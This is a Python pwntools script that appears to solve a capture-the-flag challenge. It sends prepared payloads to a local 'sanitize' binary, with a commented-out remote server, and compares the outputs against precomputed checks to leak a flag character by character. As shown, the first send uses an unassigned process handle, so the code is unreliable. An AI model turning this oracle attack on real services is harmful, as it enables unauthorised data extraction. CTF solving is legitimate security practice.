from __future__ import print_function
from pwn import *  
from time import *
context.log_level = 'error'
flag = 'flag{this_is_a_testing_flag_TESTING_0123456P)+_)!@#":}'
f = open('flag','w+')
f.write(flag)
f.close()
payloads = []
check = []
check2 = []
result = []
g = open('payload','r')
h = open('check','r')
t = open('check2','r')
for i in range(0x7f-0x20):
    s = g.read(14)
    payloads.append(s)
    s = h.read(657)
    check.append(s)
    s = t.readline()
    check2.append(s[0:-1])
    result.append('')
flag = 'flag{'
for i in range(5,0x7f):
    for j in range(0x20,0x7f-2):
        payload = payloads[j-0x20][0:8]+str(i)+payloads[j-0x20][9:]
        # p = process('./sanitize')
        # p = remote("111.186.63.16",20193)
        p.send(payload)
        s = p.recv()
        p.close()
        payload = payloads[j-0x20+1][0:8]+str(i)+payloads[j-0x20+1][9:]
        p = process('./sanitize')
        # p = remote("111.186.63.16",20193)
        p.send(payload)
        r = p.recv()
        p.close()

        if s!= check[j-0x20] and r == check[j-0x20+1]:
            print(chr(j+1),end = '')
            result[i-5]+=(chr(j+1))
    print('')
    flag+=chr(check2.index(result[i-5])+0x20)
    print(flag)

